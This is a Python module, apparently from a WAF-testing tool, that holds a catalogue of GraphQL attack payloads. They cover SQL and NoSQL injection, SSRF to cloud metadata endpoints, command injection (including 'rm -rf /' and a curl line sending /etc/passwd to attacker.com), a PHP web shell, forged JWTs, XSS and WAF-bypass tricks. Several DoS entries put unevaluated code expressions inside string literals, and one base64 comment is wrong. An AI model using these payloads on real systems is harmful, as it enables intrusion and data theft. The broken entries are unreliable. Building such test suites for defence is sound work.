#!/usr/bin/env python3
"""
GraphQL Attack Vectors

This module contains attack vectors that are specific to GraphQL API endpoints,
focusing on various attack techniques and vulnerabilities common in GraphQL implementations.
"""

class GraphQLVectors:
    """GraphQL attack vectors for testing WAF rules."""
    
    # Basic GraphQL queries and operations
    BASIC = [
        # Simple introspection query
        """{"query":"{ __schema { types { name } } }"}""",
        
        # Basic query
        """{"query":"{ user(id: 1) { id, name, email } }"}""",
        
        # Basic mutation
        """{"query":"mutation { createUser(name: \"test\", email: \"test@example.com\") { id } }"}""",
        
        # Basic subscription
        """{"query":"subscription { newMessages { id, content } }"}""",
        
        # Query with variables
        """{"query":"query getUser($id: ID!) { user(id: $id) { name } }","variables":{"id":"1"}}""",
        
        # Query with fragments
        """{"query":"{ user(id: 1) { ...userFields } } fragment userFields on User { id name email }"}""",
        
        # Query with directives
        """{"query":"{ user(id: 1) { name @include(if: true) email @skip(if: false) } }"}""",
        
        # Query with aliases
        """{"query":"{ admin: user(id: 1) { name } regular: user(id: 2) { name } }"}""",
        
        # Query with nested fields
        """{"query":"{ user(id: 1) { name posts { title comments { text } } } }"}""",
        
        # Query with operation name
        """{"query":"query GetUserData { user(id: 1) { name } }","operationName":"GetUserData"}"""
    ]
    
    # Information disclosure via introspection
    INTROSPECTION = [
        # Full schema introspection
        """{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}""",
        
        # Type introspection
        """{"query":"{ __type(name: \"User\") { name fields { name type { name kind ofType { name kind } } } } }"}""",
        
        # Query type introspection
        """{"query":"{ __schema { queryType { fields { name description args { name type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } } } }"}""",
        
        # Mutation type introspection
        """{"query":"{ __schema { mutationType { fields { name description args { name type { name kind } } type { name kind } } } } }"}""",
        
        # Sensitive type information lookup
        """{"query":"{ __type(name: \"User\") { name fields { name type { name } } } }"}""",
        """{"query":"{ __type(name: \"Admin\") { name fields { name type { name } } } }"}""",
        """{"query":"{ __type(name: \"PrivateData\") { name fields { name type { name } } } }"}""",
        """{"query":"{ __type(name: \"Credential\") { name fields { name type { name } } } }"}""",
        """{"query":"{ __type(name: \"Token\") { name fields { name type { name } } } }"}""",
        
        # Enumerate all input types
        """{"query":"{ __schema { types { name kind inputFields { name type { name kind } } } } }"}""",
        
        # Get all enum values
        """{"query":"{ __schema { types { name kind enumValues { name } } } }"}""",
        
        # Check for GraphQL version info
        """{"query":"{ __schema { description } }"}"""
    ]
    
    # Authorization bypass and privilege escalation
    AUTH_BYPASS = [
        # Direct ID access without authorization
        """{"query":"{ user(id: 1) { id, name, email, role, password } }"}""",
        
        # Access admin data
        """{"query":"{ admin(id: 1) { privileges, users { id, name, email } } }"}""",
        
        # Hidden field access
        """{"query":"{ user(id: 1) { password, passwordResetToken, secretQuestion } }"}""",
        
        # Batch query to bypass rate limits
        """{"query":"{ user1: user(id: 1) { name } user2: user(id: 2) { name } user3: user(id: 3) { name } user4: user(id: 4) { name } user5: user(id: 5) { name } }"}""",
        
        # Mutation with escalated privileges
        """{"query":"mutation { updateUser(id: 1, role: \"ADMIN\") { success } }"}""",
        
        # Bypass access controls with fragments
        """{"query":"fragment sensitiveFields on User { adminAccess apiTokens permissions } query { user(id: 1) { id name ...sensitiveFields } }"}""",
        
        # Access control check bypass with nested queries
        """{"query":"{ public { user { private { secretData } } } }"}""",
        
        # Multiple operation abuse
        """{"query":"query GetUserName { user(id: 1) { name } } query GetUserPrivateData { user(id: 1) { password, creditCardNumber } }","operationName":"GetUserName"}""",
        
        # Mutation with direct object reference
        """{"query":"mutation { deleteUser(id: 5) { success } }"}"""
    ]
    
    # SQL injection through GraphQL
    SQL_INJECTION = [
        # Basic SQL injection in arguments
        """{"query":"{ user(id: \\"1\\' OR 1=1--\\") { id, name } }"}""",
        
        # SQL injection in variables
        """{"query":"query getUser($id: ID!) { user(id: $id) { name } }","variables":{"id":"1' OR '1'='1"}}""",
        
        # Union-based injection
        """{"query":"{ user(id: \\"1\\' UNION SELECT 1,username,password,4,5 FROM users--\\") { id, name } }"}""",
        
        # Error-based injection
        """{"query":"{ user(id: \\"1\\' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT username FROM users LIMIT 1),0x3a,floor(rand()*2))x FROM information_schema.tables GROUP BY x)a)--\\") { id, name } }"}""",
        
        # Time-based blind injection
        """{"query":"{ user(id: \\"1\\' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--\\") { id, name } }"}""",
        
        # Boolean-based blind injection
        """{"query":"{ user(id: \\"1\\' AND (SELECT 1 FROM users WHERE username=\\'admin\\' AND LENGTH(password)>5)--\\") { id, name } }"}""",
        
        # SQL injection in order by clause
        """{"query":"{ users(orderBy: \\"name DESC; DROP TABLE users;--\\") { id, name } }"}""",
        
        # Injection in search/filter parameters
        """{"query":"{ users(filter: \\"name = 'test' OR 1=1--\\") { id, name } }"}""",
        
        # Nested query SQL injection
        """{"query":"{ user(id: 1) { posts(search: \\"' OR '1'='1\\") { id, title } } }"}"""
    ]
    
    # NoSQL injection through GraphQL
    NOSQL_INJECTION = [
        # MongoDB injection in arguments
        """{"query":"{ user(id: \\"{\\\"$gt\\\":\\\"\\\"}\\") { id, name } }"}""",
        
        # MongoDB injection in variables
        """{"query":"query getUser($id: ID!) { user(id: $id) { name } }","variables":{"id":{"$ne":null}}}""",
        
        # Regex operator abuse
        """{"query":"query getUser($username: String!) { user(username: $username) { name } }","variables":{"username":{"$regex":"^adm"}}}""",
        
        # MongoDB where injection
        """{"query":"{ users(where: \\"{\\\"password\\\":{\\\"$exists\\\":true}}\\") { id, name, password } }"}""",
        
        # MongoDB operators in filter
        """{"query":"{ users(filter: \\"{\\\"$where\\\":\\\"this.isAdmin == true\\\"}\\") { id, name } }"}""",
        
        # MongoDB javascript execution
        """{"query":"{ users(filter: \\"{\\\"$where\\\":\\\"function(){sleep(10000)}\\"}\\") { id, name } }"}"""
    ]
    
    # Denial of Service (DoS) attacks
    DOS = [
        # Deep nested queries (recursion bombs)
        """{"query":"{ user(id: 1) { posts { comments { author { posts { comments { author { posts { comments { author { posts { comments { text } } } } } } } } } } } } }"}""",
        
        # Large batch query
        """{"query":"{ " + "user" * 1000 + "(id: 1) { name } }"}""",
        
        # Expensive query with many results
        """{"query":"{ users(limit: 10000) { id, name, email, posts { id, title, comments { id, text } } } }"}""",
        
        # Field duplication
        """{"query":"{ user(id: 1) { " + "name ".repeat(1000) + "} }"}""",
        
        # Resource-intensive operations
        """{"query":"{ users(orderBy: \"computeExpensiveMetric\") { id, name, complexCalculation } }"}""",
        
        # Circular fragment reference
        """{"query":"fragment F1 on User { ...F2 } fragment F2 on User { ...F3 } fragment F3 on User { ...F1 } query { user { ...F1 } }"}""",
        
        # Alias abuse for response amplification
        """{"query":"{ " + " ".join([f"u{i}: user(id: 1) {{ name }}" for i in range(1000)]) + " }"}""",
        
        # Large string input
        """{"query":"mutation { createPost(title: \\"" + "A" * 1000000 + "\\", content: \\"test\\") { id } }"}""",
        
        # Slow regex in arguments
        """{"query":"{ users(search: \\"^(a+)+$\\") { id, name } }"}"""
    ]
    
    # Server-side request forgery (SSRF)
    SSRF = [
        # URL parameter manipulation
        """{"query":"mutation { importDataFromUrl(url: \\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\\") { success } }"}""",
        
        # URL in variables
        """{"query":"mutation ImportData($url: String!) { importDataFromUrl(url: $url) { success } }","variables":{"url":"file:///etc/passwd"}}""",
        
        # Image or file URL processing
        """{"query":"mutation { uploadImageFromUrl(url: \\"http://localhost:8080/admin\\") { path } }"}""",
        
        # Internal service access
        """{"query":"mutation { processWebhook(url: \\"http://internal-service:8080/api/sensitive-data\\") { result } }"}""",
        
        # Local file inclusion
        """{"query":"{ file(path: \\"/etc/passwd\\") { content } }"}""",
        
        # DNS rebinding attack
        """{"query":"mutation { fetchData(endpoint: \\"attacker-controlled-domain.com\\") { result } }"}""",
        
        # AWS metadata service
        """{"query":"mutation { importDataFromUrl(url: \\"http://169.254.169.254/latest/user-data\\") { success } }"}""",
        
        # Docker API access
        """{"query":"mutation { importDataFromUrl(url: \\"http://localhost:2375/containers/json\\") { success } }"}""",
        
        # Webhook URL exploitation
        """{"query":"mutation { addWebhook(url: \\"http://internal.company.intranet/api/admin\\") { id } }"}"""
    ]
    
    # Remote code execution (RCE) 
    RCE = [
        # Template injection
        """{"query":"mutation { renderTemplate(template: \\"<%= %x(cat /etc/passwd) %>\\") { result } }"}""",
        
        # Command injection in filename
        """{"query":"mutation { processFile(filename: \\"file.txt; rm -rf /\\") { success } }"}""",
        
        # Embedded JavaScript execution
        """{"query":"{ runReportQuery(query: \\"x; process.mainModule.require('child_process').execSync('cat /etc/passwd');\\") { result } }"}""",
        
        # GraphQL directives abuse
        """{"query":"{ user(id: 1) { name @exploit(code: \\"process.exit(1)\\") } }"}""",
        
        # Serialization attacks
        """{"query":"mutation { importData(data: \\"{\\"__proto__\\":{}}\\") { success } }"}""",
        
        # Command injection through sorting parameters
        """{"query":"{ users(orderBy: \\"name; exec('curl attacker.com/$(cat /etc/passwd)')\\") { id, name } }"}""",
        
        # XML parsing exploitation
        """{"query":"mutation { processXML(data: \\"<?xml version=\\\\\\"1.0\\\\\\" encoding=\\\\\\"ISO-8859-1\\\\\\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \\\\\\"file:///etc/passwd\\\\\\">]><foo>&xxe;</foo>\\") { result } }"}""",
        
        # Server-side includes
        """{"query":"mutation { createPage(content: \\"<!--#exec cmd=\\\\\\"cat /etc/passwd\\\\\\"-->\\") { url } }"}""",
        
        # File upload filter bypass
        """{"query":"mutation { uploadFile(filename: \\"exploit.php.jpg\\", content: \\"<?php system($_GET['cmd']); ?>\\") { path } }"}"""
    ]
    
    # WAF Bypass Techniques
    WAF_BYPASS = [
        # Nested JSON objects to hide payloads
        """{"query":"{ user(input: { id: 1, details: { payload: \\"'--\\\\\\\\\\\\\\\\\\") } }) { name } }"}""",
        
        # Fragmented payloads
        """{"query":"{ us","query":"er(id: 1) { name } }"}""",
        
        # Uncommon content-types
        # (This would be set in the HTTP header, not the query itself)
        "Content-Type: application/graphql",
        "Content-Type: text/plain",
        
        # Base64 encoded payloads
        """{"query":"{ user(id: \\"MSCGOVCG\\") { name } }"}""",  # 1' OR 1=1-- in base64
        
        # Character encoding variations
        """{"query":"{ user(id: \\"1\\\\u0027 OR 1=1--\\") { name } }"}""",
        
        # Alternative query styles (query shorthand)
        """user(id: 1) { name }""",  # Instead of {"query":"{ user(id: 1) { name } }"}
        
        # Non-standard JSON escaping
        """{"query":"{ user(id: \"1\\\\' OR 1=1--\") { name } }"}""",
        
        # Mixed case keywords
        """{"query":"{ uSeR(Id: 1) { NaMe } }"}""",
        
        # HTTP Parameter Pollution
        "query={ user(id: 1) { name } }&query={ user(id: 2) { email } }",
        
        # Multipart request obfuscation
        # (This would be part of a multipart form request)
        "Content-Disposition: form-data; name=\"operations\"\r\n\r\n{\"query\":\"mutation { uploadFile }\"}",
        
        # Batched queries with nested arrays
        """[{"query":"{ user(id: 1) { name } }"},{"query":"{ user(id: 2) { name } }"}]""",
        
        # Custom HTTP headers to bypass inspections
        "X-GraphQL-Query: { user(id: 1) { name } }",
        
        # WebSocket protocol to bypass HTTP filtering
        # (This would be used in a WebSocket connection instead of HTTP)
        """{"type":"start","payload":{"query":"{ user(id: 1) { name } }"}}"""
    ]
    
    # JSON Web Token (JWT) attacks
    JWT_ATTACKS = [
        # None algorithm attack
        """{"query":"mutation { login(token: \\"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.\\") { success } }"}""",
        
        # Weak HMAC signature attack
        """{"query":"mutation { login(token: \\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\\") { success } }"}""",
        
        # JWT header parameter injection
        """{"query":"mutation { login(token: \\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleTEiLCJ4LWludGVybmFsLXNvdXJjZSI6InRydWUifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\\") { success } }"}""",
        
        # Algorithm switching attack
        """{"query":"mutation { login(token: \\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.NHVaYe26MbtOYhSKkoKYdFVomg4i8ZJd8_-RU8VNbftc4TSMb4bXP3l3YlNWACwyXPGffz5aXHc6lty1Y2t4SWRqGteragsVdZufDn5BlnJl9pdR_kdVFUsra2rWKEofkZeIC4yWytE58sMIihvo9H1ScmmVwBcQP6XETqYd0aSHp1gOa9RdUPDvoXQ5oqygTqVtxaDr6wUFKrKItgBMzWIdNZ6y7O9E0DhEPTbE9rfBo6KTFsHAZnMg4k68CDp2woYIaXbmYTWcvbzIuHO7_37GT79XdIwkm95QJ7hYC9RiwrV7mesbY4PAahERJawntho0my942XheVLmGwLMBkQ\\") { success } }"}""",
        
        # Brute force weak secret
        """{"query":"mutation { login(token: \\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.\\") { success } }"}""",
        
        # Expired token manipulation
        """{"query":"mutation { login(token: \\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjk5OTk5OTk5OTksInJvbGUiOiJhZG1pbiJ9.p6J1eN6xtO5i0t_Xzrt7bhNBeUILA_qyJakKtdxy-hw\\") { success } }"}""",
        
        # Token replay attack
        """{"query":"mutation { refreshToken(token: \\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJqdGkiOiJhYmMxMjMifQ.JqLc7TFY0LhzP5D_SPpYJPg0JGtbXMHBV0m-6v4kN-8\\") { newToken } }"}"""
    ]
    
    # Miscellaneous Attacks
    MISC = [
        # Persisted XSS
        """{"query":"mutation { createComment(postId: 1, text: \\"<script>alert('XSS')</script>\\") { id } }"}""",
        
        # Stored XSS via GraphQL
        """{"query":"mutation { updateProfile(bio: \\"<img src=x onerror=alert(1)>\\") { success } }"}""",
        
        # Path traversal
        """{"query":"mutation { uploadFile(filename: \\"../../../etc/passwd\\", content: \\"test\\") { path } }"}""",
        
        # CSV injection
        """{"query":"mutation { updateUser(name: \\"=cmd|' /C calc'!A1\\") { success } }"}""",
        
        # GraphQL field suggestion abuse
        """{"query":"{ user { naem } }"}""",  # Attempt to trigger field suggestion leakage
        
        # Race condition
        """{"query":"mutation { withdrawFunds(amount: 100) { success } }"}""",  # Send multiple times
        
        # Custom scalar type abuse
        """{"query":"mutation { createDate(date: \\"2023-04-01'); DROP TABLE users; --\\") { id } }"}""",
        
        # Input validation bypass
        """{"query":"mutation { createUser(email: \\"user+test@example.com\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n<script>alert(1)</script>\\") { id } }"}""",
        
        # API versioning bypass
        """{"query":"{ __schema { queryType { name } } }","version":"v1"}""",  # Attempt to access newer schema from older API version
        
        # Client-side query protection bypass
        """{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"abcdef1234567890"}}}"""  # Attempt to bypass allowlist with fake hash
    ]
    
    @classmethod
    def all(cls) -> list:
        """Return all GraphQL vectors."""
        return (
            cls.BASIC +
            cls.INTROSPECTION +
            cls.AUTH_BYPASS +
            cls.SQL_INJECTION +
            cls.NOSQL_INJECTION +
            cls.DOS +
            cls.SSRF +
            cls.RCE +
            cls.WAF_BYPASS +
            cls.JWT_ATTACKS +
            cls.MISC
        )
    
    @classmethod
    def basic(cls) -> list:
        """Return basic GraphQL vectors."""
        return cls.BASIC
    
    @classmethod
    def introspection(cls) -> list:
        """Return introspection GraphQL vectors."""
        return cls.INTROSPECTION
    
    @classmethod
    def auth_bypass(cls) -> list:
        """Return authentication bypass GraphQL vectors."""
        return cls.AUTH_BYPASS
    
    @classmethod
    def sql_injection(cls) -> list:
        """Return SQL injection GraphQL vectors."""
        return cls.SQL_INJECTION
    
    @classmethod
    def nosql_injection(cls) -> list:
        """Return NoSQL injection GraphQL vectors."""
        return cls.NOSQL_INJECTION
    
    @classmethod
    def dos(cls) -> list:
        """Return denial of service GraphQL vectors."""
        return cls.DOS
    
    @classmethod
    def ssrf(cls) -> list:
        """Return SSRF GraphQL vectors."""
        return cls.SSRF
    
    @classmethod
    def rce(cls) -> list:
        """Return remote code execution GraphQL vectors."""
        return cls.RCE
    
    @classmethod
    def waf_bypass(cls) -> list:
        """Return WAF bypass GraphQL vectors."""
        return cls.WAF_BYPASS
    
    @classmethod
    def jwt_attacks(cls) -> list:
        """Return JWT attack GraphQL vectors."""
        return cls.JWT_ATTACKS
    
    @classmethod
    def misc(cls) -> list:
        """Return miscellaneous GraphQL vectors."""
        return cls.MISC 